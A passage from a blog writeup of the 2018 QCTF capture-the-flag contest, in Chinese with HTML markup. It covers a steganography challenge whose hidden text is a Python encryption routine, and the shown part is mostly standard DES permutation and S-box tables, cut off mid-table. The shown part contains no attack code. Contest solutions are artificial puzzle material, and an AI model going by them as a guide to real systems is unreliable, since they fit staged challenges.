<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  
  <title>2018-QCTF-writeup | AssassinQ</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  <meta name="keywords" content="ctfwp">
  
  
  
  
  <meta name="description" content="其实大部分是看着大佬wp的复现。感觉自己实力还是欠缺很多。">
<meta name="keywords" content="ctf,wp">
<meta property="og:type" content="article">
<meta property="og:title" content="2018-QCTF-writeup">
<meta property="og:url" content="https://qianfei11.github.io/2018/07/21/【未完成】2018-QCTF-writeup/index.html">
<meta property="og:site_name" content="AssassinQ">
<meta property="og:description" content="其实大部分是看着大佬wp的复现。感觉自己实力还是欠缺很多。">
<meta property="og:locale" content="default">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-QCTF-writeup/1.png">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-QCTF-writeup/2.png">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-QCTF-writeup/3.png">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-QCTF-writeup/4.png">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-QCTF-writeup/5.png">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-QCTF-writeup/6.png">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-QCTF-writeup/7.png">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-QCTF-writeup/8.png">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-QCTF-writeup/9.png">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-QCTF-writeup/10.png">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-QCTF-writeup/11.png">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-QCTF-writeup/12.png">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-QCTF-writeup/13.png">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-QCTF-writeup/15.png">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-QCTF-writeup/16.png">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-QCTF-writeup/17.png">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-QCTF-writeup/18.png">
<meta property="og:updated_time" content="2019-01-25T07:46:31.089Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="2018-QCTF-writeup">
<meta name="twitter:description" content="其实大部分是看着大佬wp的复现。感觉自己实力还是欠缺很多。">
<meta name="twitter:image" content="https://qianfei11.github.io/pics/2018-QCTF-writeup/1.png">
  
    <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
  
  <link rel="icon" href="/css/images/favicon.ico">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
    
  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">

  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css">
  <link rel="stylesheet" href="/css/fashion.css">
  <link rel="stylesheet" href="/css/glyphs.css">

</head>
</html>


  <body data-spy="scroll" data-target="#toc" data-offset="50">


  
  
  <div class="site-header-image">
    <img id="originBg" width="100%" alt="Hike News" src>
  </div>

  <div id="header-blur" class="site-header-image blur" style="position: absolute; top:0; height: 207px; min-height: 207px; min-width: 100%;">
    <img id="blurBg" width="100%" style="top: 96%" alt="Hike News" src>
  </div>

  <script>
        var imgUrls = "css/images/pose01.jpg".split(",");
        var random = Math.floor((Math.random() * imgUrls.length ));
        if (imgUrls[random].startsWith('http') || imgUrls[random].indexOf('://') >= 0) {
          document.getElementById("originBg").src=imgUrls[random];
          document.getElementById("blurBg").src=imgUrls[random];
        } else {
          document.getElementById("originBg").src='/' + imgUrls[random];
          document.getElementById("blurBg").src='/' + imgUrls[random];
        }
    </script>




<header id="allheader" class="site-header" role="banner" style="width: 100%; position: absolute; top:0; background: rgba(255,255,255,.8);">
  <div class="clearfix container">
      <div class="site-branding">

          <h1 class="site-title">
            
              <a href="/" title="AssassinQ" rel="home"> AssassinQ </a>
            
          </h1>
          
          
            <div class="site-description">ZJGSU-IS-17</div>
          
            
          <nav id="main-navigation" class="main-navigation" role="navigation">
            <a class="nav-open">Menu</a>
            <a class="nav-close">Close</a>

            <div class="clearfix sf-menu">
              <ul id="main-nav" class="menu sf-js-enabled sf-arrows" style="touch-action: pan-y;">
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/">Home</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/archives">Archives</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/tags">Tags</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/about">About</a> </li>
                    
              </ul>
            </div>
          </nav>

      </div>
  </div>
</header>


  <div id="container">
    <div id="wrap">
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;"><article id="post-【未完成】2018-QCTF-writeup" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost">
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      2018-QCTF-writeup
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2018/07/21/【未完成】2018-QCTF-writeup/" class="article-date">
	  <time datetime="2018-07-21T11:56:59.000Z" itemprop="datePublished">July 21, 2018</time>
	</a>

       
      

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>其实大部分是看着大佬wp的复现。感觉自己实力还是欠缺很多。</p>
<a id="more"></a>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="picture"><a href="#picture" class="headerlink" title="picture"></a>picture</h2><p>通过stegsolve判断出存在最低位隐写。使用lsb工具解出密文，为一段加密函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#_*_ coding:utf-8 _*_</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">ip=  (<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>,</span><br><span class="line">      <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">      <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>,</span><br><span class="line">      <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">      <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span> , <span class="number">1</span>,</span><br><span class="line">      <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">      <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>,</span><br><span class="line">      <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">ip_1=(<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>,</span><br><span class="line">      <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">      <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>,</span><br><span class="line">      <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">      <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>,</span><br><span class="line">      <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">      <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line">      <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>,  <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>)</span><br><span class="line"></span><br><span class="line">e  =(<span class="number">32</span>, <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">4</span>,  <span class="number">5</span>, </span><br><span class="line">       <span class="number">6</span>, <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>,  <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, </span><br><span class="line">      <span class="number">12</span>,<span class="number">13</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">      <span class="number">16</span>,<span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">      <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,<span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>,</span><br><span class="line">      <span class="number">28</span>, <span class="number">29</span>,<span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>,  <span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">p=(<span class="number">16</span>,  <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>,</span><br><span class="line">     <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>,  <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>, </span><br><span class="line">     <span class="number">2</span>,  <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">27</span>,  <span class="number">3</span>,  <span class="number">9</span>,</span><br><span class="line">     <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">11</span>,  <span class="number">4</span>,  <span class="number">25</span>)</span><br><span class="line"></span><br><span class="line">s=[ [[<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>,  <span class="number">1</span>,  <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>,  <span class="number">8</span>,  <span class="number">3</span>, <span class="number">10</span>,  <span class="number">6</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">9</span>,  <span class="number">0</span>,  <span class="number">7</span>],</span><br><span class="line">     [<span class="number">0</span>, <span class="number">15</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">14</span>,  <span class="number">2</span>, <span class="number">13</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">3</span>,  <span class="number">8</span>],</span><br><span class="line">     [<span class="number">4</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">8</span>, <span class="number">13</span>,  <span class="number">6</span>,  <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">7</span>,  <span class="number">3</span>, <span class="number">10</span>,  <span class="number">5</span>,  <span class="number">0</span>],    </span><br><span class="line">     [<span class="number">15</span>, <span class="number">12</span>,  <span class="number">8</span>,  <span class="number">2</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">1</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">13</span>]],</span><br><span class="line"></span><br><span class="line">     [[<span class="number">15</span>,  <span class="number">1</span>,  <span class="number">8</span>, <span class="number">14</span>,  <span class="number">6</span>, <span class="number">11</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">5</span>, <span class="number">10</span>],     </span><br><span class="line">     [<span class="number">3</span>, <span class="number">13</span>,  <span class="number">4</span>,  <span class="number">7</span>, <span class="number">15</span>,  <span class="number">2</span>,  <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">6</span>,  <span class="number">9</span>, <span class="number">11</span>,  <span class="number">5</span>],     </span><br><span class="line">     [<span class="number">0</span>, <span class="number">14</span>,  <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>,  <span class="number">4</span>, <span class="number">13</span>,  <span class="number">1</span>,  <span class="number">5</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">3</span>,  <span class="number">2</span>, <span class="number">15</span>],     </span><br><span class="line">     [<span class="number">13</span>,  <span class="number">8</span>, <span class="number">10</span>,  <span class="number">1</span>,  <span class="number">3</span>, <span class="number">15</span>,  <span class="number">4</span>,  <span class="number">2</span>, <span class="number">11</span>,  <span class="number">6</span>,  <span class="number">7</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">5</span>, <span class="number">14</span>,  <span class="number">9</span>]],</span><br><span class="line"></span><br><span class="line">     [[<span class="number">10</span>,  <span class="number">0</span>,  <span class="number">9</span>, <span class="number">14</span>,  <span class="number">6</span>,  <span class="number">3</span>, <span class="number">15</span>,  <span class="number">5</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">7</span>, <span class="number">11</span>,  <span class="number">4</span>,  <span class="number">2</span>,  <span class="number">8</span>],     </span><br><span class="line">     [<span class="number">13</span>,  <span class="number">7</span>,  <span class="number">0</span>,  <span class="number">9</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">6</span>, <span class="number">10</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>,  <span class="number">1</span>],   </span><br><span class="line">     [<span class="number">13</span>,  <span class="number">6</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">8</span>, <span class="number">15</span>,  <span class="number">3</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">1</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>,  <span class="number">7</span>],     </span><br><span class="line">     [<span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>,  <span class="number">0</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">8</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>,  <span class="number">3</span>, <span class="number">11</span>,  <span class="number">5</span>,  <span class="number">2</span>, <span class="number">12</span>]],</span><br><span class="line"></span><br><span class="line">    [[<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>,  <span class="number">3</span>,  <span class="number">0</span>,  <span class="number">6</span>,  <span class="number">9</span>, <span class="number">10</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">5</span>, <span class="number">11</span>,  <span class="number">12</span>,  <span class="number">4</span>, <span class="number">15</span>],     </span><br><span class="line">     [<span class="number">13</span>,  <span class="number">8</span>, <span class="number">11</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>,<span class="number">9</span>],     </span><br><span class="line">     [<span class="number">10</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>,  <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>,  <span class="number">1</span>,  <span class="number">3</span>, <span class="number">14</span>,  <span class="number">5</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">4</span>],     </span><br><span class="line">     [<span class="number">3</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">10</span>,  <span class="number">1</span>, <span class="number">13</span>,  <span class="number">8</span>,  <span class="number">9</span>,  <span class="number">4</span>,  <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">14</span>]],</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    [[<span class="number">2</span>, <span class="number">12</span>,  <span class="number">4</span>,  <span class="number">1</span>,  <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">5</span>,  <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>,  <span class="number">0</span>, <span class="number">14</span>,  <span class="number">9</span>],     </span><br><span class="line">     [<span class="number">14</span>, <span class="number">11</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">4</span>,  <span class="number">7</span>, <span class="number">13</span>,  <span class="number">1</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>,  <span class="number">3</span>,  <span class="number">9</span>,  <span class="number">8</span>,  <span class="number">6</span>],     </span><br><span class="line">     [<span class="number">4</span>,  <span class="number">2</span>,  <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>,  <span class="number">7</span>,  <span class="number">8</span>, <span class="number">15</span>,  <span class="number">9</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">3</span>,  <span class="number">0</span>, <span class="number">14</span>],     </span><br><span class="line">     [<span class="number">11</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">7</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">2</span>, <span class="number">13</span>,  <span class="number">6</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">9</span>, <span class="number">10</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">3</span>]],</span><br><span class="line"></span><br><span class="line">    [[<span class="number">12</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>,  <span class="number">9</span>,  <span class="number">2</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">0</span>, <span class="number">13</span>,  <span class="number">3</span>,  <span class="number">4</span>, <span class="number">14</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">11</span>],</span><br><span class="line">     [<span class="number">10</span>, <span class="number">15</span>,  <span class="number">4</span>,  <span class="number">2</span>,  <span class="number">7</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">3</span>,  <span class="number">8</span>],     </span><br><span class="line">     [<span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>,  <span class="number">5</span>,  <span class="number">2</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">3</span>,  <span class="number">7</span>,  <span class="number">0</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>,  <span class="number">6</span>],     </span><br><span class="line">     [<span class="number">4</span>,  <span class="number">3</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>,  <span class="number">1</span>,  <span class="number">7</span>,  <span class="number">6</span>,  <span class="number">0</span>,  <span class="number">8</span>, <span class="number">13</span>]],</span><br><span class="line"></span><br><span class="line">    [[<span class="number">4</span>, <span class="number">11</span>,  <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">8</span>, <span class="number">13</span>,  <span class="number">3</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">10</span>,  <span class="number">6</span>,  <span class="number">1</span>],     </span><br><span class="line">     [<span class="number">13</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">7</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>,  <span class="number">3</span>,  <span class="number">5</span>, <span class="number">12</span>,  <span class="number">2</span>, <span class="number">15</span>,  <span class="number">8</span>,  